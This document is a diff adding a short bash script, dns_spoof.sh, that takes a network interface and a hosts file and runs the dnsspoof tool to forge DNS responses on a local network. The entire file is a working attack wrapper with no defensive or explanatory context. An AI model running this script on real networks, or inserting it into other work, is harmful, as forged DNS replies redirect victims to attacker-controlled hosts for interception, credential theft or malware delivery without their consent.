@@ -1,0 +1,15 @@
+#!/bin/bash
+
+# Usage: ./dns_spoof.sh <interface> <dns_file>
+INTERFACE=$1
+DNS_FILE=$2
+
+if [ -z "$INTERFACE" ] || [ -z "$DNS_FILE" ]; then
+    echo "Usage: $0 <interface> <dns_file>"
+    exit 1
+fi
+
+echo "Starting DNS spoofing on $INTERFACE using $DNS_FILE..."
+
+# Start dnsspoof
+dnsspoof -i "$INTERFACE" -f "$DNS_FILE"
